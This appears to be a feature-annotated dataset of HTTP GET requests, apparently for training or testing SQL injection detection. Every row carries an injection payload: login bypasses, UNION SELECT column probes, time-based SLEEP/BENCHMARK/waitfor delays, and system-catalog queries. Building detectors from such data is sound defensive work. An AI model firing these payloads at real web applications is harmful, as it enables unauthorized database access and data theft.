50,2,200,1948,7,17,13,1,1,GET ?id=' or 0=0 #&pass=' and 'one'='one– HTTP/1.1
105,1,200,2435,21,4,5,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25--  HTTP/1.1
105,1,200,7685,21,4,5,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25--  HTTP/1.1
93,1,200,1010,24,22,8,1,1,GET ?user=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,6997,24,22,8,1,1,GET ?user=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,3456,24,22,8,1,1,GET ?user=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
103,1,200,4439,30,5,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
99,1,200,6211,30,4,13,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18 HTTP/1.1
95,1,200,6656,31,7,12,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
180,2,200,3909,69,9,29,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88)))-- &phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
178,2,200,1663,55,4,22,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11#&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
59,2,200,4802,9,19,17,1,1,GET ?phone= OR 1=1#&id='));waitfor delay '0:0:5'-- HTTP/1.1
162,2,200,2831,96,7,20,1,1,GET ?phone= ORDER BY 27# &id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
331,2,200,2575,200,12,40,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
103,2,200,5577,42,16,22,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))#&phone=admin' or '1'='1'# HTTP/1.1
154,1,200,3827,46,4,16,1,1,GET ?mail= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28# HTTP/1.1
34,1,200,2064,14,4,5,1,1,GET ?pass= ORDER BY 25--  HTTP/1.1
34,1,200,3022,14,4,5,1,1,GET ?pass= ORDER BY 25--  HTTP/1.1
174,1,200,5336,82,7,33,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116)))# HTTP/1.1
96,2,200,4350,30,18,21,1,1,GET ?email=') or pg_sleep(5)--&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
113,2,200,2105,31,31,17,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6&pass=' group by userid having 1=1-- HTTP/1.1
93,2,200,6036,30,11,26,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6-- &tel=")) or (("x"))=(("x HTTP/1.1
61,1,200,4750,7,39,5,1,1,GET ?code=select session_user from sysibm.sysdummy1; HTTP/1.1
61,1,200,4573,7,39,5,1,1,GET ?code=select session_user from sysibm.sysdummy1; HTTP/1.1
189,2,200,6142,109,13,21,1,1,GET ?id=admin") or "1"="1&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
31,1,200,2467,14,2,5,1,1,GET ?id= ORDER BY 3--  HTTP/1.1
43,1,200,7187,7,17,9,1,1,GET ?username=admin'or 1=1 or ''=' HTTP/1.1
48,1,200,2035,7,27,6,1,1,GET ?pass=select * from syscat.tabauth; HTTP/1.1
48,1,200,7037,7,27,6,1,1,GET ?pass=select * from syscat.tabauth; HTTP/1.1
159,2,200,3154,55,7,23,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15-- &id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6 HTTP/1.1
125,2,200,7888,65,6,20,1,1,GET ?id=" or 1=1 –&id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL--  HTTP/1.1
38,2,200,4018,9,7,10,1,1,GET ?name=" --&tel= OR 1=0--  HTTP/1.1
42,2,200,5889,14,9,7,1,1,GET ?email="-"&pass= ORDER BY 7#  HTTP/1.1
145,1,200,3391,46,2,15,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
145,1,200,4430,46,2,15,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
253,2,200,2638,110,10,50,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))&pass= or 0=0 # HTTP/1.1
63,2,200,1795,7,26,13,1,1,GET ?username=admin' or '1'='1&pass=admin") or ("1"="1 HTTP/1.1
221,1,200,4346,102,4,44,1,1,GET ?user= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106)))--  HTTP/1.1
59,2,200,2938,7,21,13,1,1,GET ?phone=admin") or ("1"="1"--&id=1 or sleep(5)# HTTP/1.1
165,2,200,3880,70,13,35,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))#&id=admin'or 1=1 or ''=' HTTP/1.1
61,2,200,4319,7,36,9,1,1,GET ?code='#&code=select user from sysibm.sysdummy1; HTTP/1.1
98,1,200,3059,31,8,11,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
141,2,200,3668,33,11,14,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25&pass= OR x=y HTTP/1.1
75,1,200,1585,21,7,5,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
75,1,200,4532,21,7,5,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
124,2,200,4593,30,16,17,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18&pass=admin" or "1"="1"# HTTP/1.1
112,2,200,4307,54,7,17,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6&name= UNION SELECT @@VERSION_SLEEP(5)_3 HTTP/1.1
106,1,200,7417,46,7,15,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11 HTTP/1.1
106,1,200,6197,46,7,15,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11 HTTP/1.1
65,1,200,1435,30,4,15,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
136,2,200,6792,28,12,8,1,1,GET ?username= ORDER BY 1-- &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28# HTTP/1.1
96,2,200,3293,14,54,10,1,1,GET ?email=select * from syscat.dbauth where grantee = current user;&pass= ORDER BY 3#  HTTP/1.1
79,2,200,6472,9,46,12,1,1,GET ?username=select current_setting('log_connections');&pass= OR 1=0# HTTP/1.1
20,1,200,4595,7,2,4,1,1,GET ?id="-" HTTP/1.1
20,1,200,1843,7,2,4,1,1,GET ?id="-" HTTP/1.1
76,2,200,2448,34,11,19,1,1,GET ?mail=' or ''*'&pass=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) HTTP/1.1
178,2,200,2987,101,11,28,1,1,GET ?name=') or ('x')=('x&tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
91,1,200,3814,31,4,11,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
54,1,200,6281,9,18,9,1,1,GET ?account=' or benchmark(10000000_MD5(1))# HTTP/1.1
196,2,200,2716,77,11,29,2,1,GET ?account=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2))))&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
32,1,200,4864,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
173,1,200,2631,82,4,34,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116)))--  HTTP/1.1
